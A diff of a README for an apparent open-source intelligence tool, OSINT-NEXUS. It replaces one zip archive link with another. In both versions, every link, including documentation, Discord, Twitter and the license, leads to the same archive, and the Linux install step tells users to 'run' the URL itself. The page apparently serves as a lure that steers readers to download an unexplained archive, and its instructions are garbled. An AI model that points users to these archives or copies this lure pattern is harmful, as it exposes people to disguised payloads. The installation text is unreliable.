@@ -6,7 +6,7 @@ OSINT-NEXUS is a powerful, cross-platform Open Source Intelligence tool. It help
 
 ## 📥 Download OSINT-NEXUS
 
-[![Download OSINT-NEXUS](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip)](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip)
+[![Download OSINT-NEXUS](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip)](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip)
 
 ## 🚀 Getting Started
 
@@ -26,14 +26,14 @@ Before you start, ensure that your system meets the following requirements:
 
 To download OSINT-NEXUS, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip) to go to the Releases page.
 2. **Select the Latest Version:** Look for the latest version listed. It will usually be at the top of the page.
-3. **Choose Your File:** Based on your operating system, find the correct file format. There are options for Windows (.exe), macOS (.dmg), and Linux (https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip).
+3. **Choose Your File:** Based on your operating system, find the correct file format. There are options for Windows (.exe), macOS (.dmg), and Linux (https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip).
 4. **Download the File:** Click the file link to start the download.
 5. **Run the Installer:**
    - **Windows:** Double-click the downloaded .exe file and follow the prompts to install.
    - **macOS:** Open the .dmg file, drag the OSINT-NEXUS icon to your Applications folder.
-   - **Linux:** Extract the https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip file. In the terminal, navigate to the extracted folder, and run `https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip` to start the installation.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip file. In the terminal, navigate to the extracted folder, and run `https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip` to start the installation.
 
 ### 🔃 Launch OSINT-NEXUS
 
@@ -67,7 +67,7 @@ If you encounter issues while using OSINT-NEXUS, here are some common problems a
 
 ## 📖 Documentation
 
-For more detailed information on using OSINT-NEXUS, check our [User Documentation](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip). Here you'll find guides on how to:
+For more detailed information on using OSINT-NEXUS, check our [User Documentation](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip). Here you'll find guides on how to:
 
 - Use specific features effectively.
 - Troubleshoot common issues.
@@ -77,16 +77,16 @@ For more detailed information on using OSINT-NEXUS, check our [User Documentatio
 
 Join our community to stay connected:
 
-- Visit our [GitHub Discussions page](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip) to share your feedback or ask questions.
-- Follow us on [Twitter](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip) for updates.
-- Join our [Discord server](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip) for real-time support and discussion.
+- Visit our [GitHub Discussions page](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip) to share your feedback or ask questions.
+- Follow us on [Twitter](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip) for updates.
+- Join our [Discord server](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip) for real-time support and discussion.
 
 ## 📜 License
 
-OSINT-NEXUS is open-source and free to use. It operates under the terms of the MIT License, allowing you to use, modify, and distribute it. For detailed license information, see the [LICENSE](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip) file in the repository.
+OSINT-NEXUS is open-source and free to use. It operates under the terms of the MIT License, allowing you to use, modify, and distribute it. For detailed license information, see the [LICENSE](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip) file in the repository.
 
 ## 🔗 Conclusion
 
 OSINT-NEXUS provides a powerful and user-friendly approach to Open Source Intelligence. Whether you are conducting research or need detailed reports, this tool equips you with essential features to succeed. 
 
-Remember, you can always download the latest version by visiting [this page](https://github.com/Davizitos007/OSINT-NEXUS/raw/refs/heads/main/src/reports/OSIN-NEXUS-3.4.zip).
+Remember, you can always download the latest version by visiting [this page](https://raw.githubusercontent.com/Davizitos007/OSINT-NEXUS/main/src/reports/OSIN_NEXUS_implementiferous.zip).
